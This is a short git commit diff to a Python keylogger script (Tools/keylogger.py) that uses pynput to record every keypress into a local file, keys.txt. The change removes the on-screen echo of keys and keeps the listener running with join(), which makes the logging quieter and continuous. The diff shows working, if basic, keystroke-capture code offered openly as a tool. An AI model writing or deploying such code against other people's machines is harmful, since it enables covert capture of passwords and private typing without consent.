e224ff0884ae7f5dbdd44c0b14da559c276ead47
Supro26 <suprojitmallick2006@gmail.com>
2025-09-22 00:17:15 +0530

    updated

--- Tools/keylogger.py
+++ Tools/keylogger.py
@@ -1,6 +1,5 @@
 from pynput import keyboard
 def keyPress(key): # the "on_press=" passes the key auto to the fn
-    print(str(key))
     with open("keys.txt",'a') as logKey:
         try:
             ch=key.char
@@ -14,4 +13,4 @@ def keyPress(key): # the "on_press=" passes the key auto to the fn
 if __name__ == "__main__":
     l=keyboard.Listener(on_press=keyPress) #creating an obj of Listener
     l.start()
-    input()
+    l.join()
